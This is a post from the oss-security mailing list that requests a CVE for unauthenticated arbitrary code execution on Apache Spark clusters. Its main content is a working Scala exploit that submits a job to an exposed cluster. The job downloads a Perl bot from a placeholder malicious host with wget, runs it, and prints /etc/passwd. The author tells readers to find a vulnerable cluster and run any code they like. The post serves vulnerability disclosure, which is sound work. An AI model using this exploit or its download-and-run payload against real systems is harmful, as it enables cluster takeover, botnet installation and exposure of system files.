  oss-security - CVE Request: Arbitary Code Execution in Apache Spark Cluster            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Thu, 16 Apr From: Akhil Das <akhil@...moidanalytics.com> To: oss-security@...ts.openwall.com Subject: CVE Request: Arbitary Code Execution in Apache Spark Cluster  # *Vendor Homepage*: https://spark.apache.org/ # *Software Link*: https://spark.apache.org/downloads.html # *Version*: All (0.0.x, 1.1.x, 1.2.x, 1.3.x) # *Tested on*:  # Reference(s) : # Exploit URL  : https://github.com/akhld/spark-exploit/  # Spark clusters which are not secured with proper firewall can be taken over easily (Since it does not have # any authentication mechanism), this exploit simply runs arbitarty codes over the cluster. # All you have to do is, find a vulnerable Spark cluster (usually runs on port add that host to your # hosts list so that your system will recognize it (here its spark-b-akhil-master pointing # to in my /etc/hosts) and submit your Spark Job with arbitary codes that you want to execute.  # Language: Scala   import org.apache.spark.{SparkContext, SparkConf}  /**  * Created by akhld on  */  object Exploit {   def main(arg: Array[String]) {     val sconf = new SparkConf()       // Set this to the vulnerable host URI       .setAppName("Exploit")       .set("spark.cores.max", "2")       .set("spark.executor.memory", "2g")       .set("spark.driver.host","hacked.work") // Set this to your host from where you launch the attack      val sc = new SparkContext(sconf)            val exploit = sc.parallelize(1 to 1).map(x=>{        //Replace these with whatever you want to get executed        val x = "wget https://mallicioushost/mal.pl -O bot.pl".!        val y = "perl bot.pl".!        scala.io.Source.fromFile("/etc/passwd").mkString     })     exploit.collect().foreach(println)   } }     Please see this blog post if you need anymore information on this   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      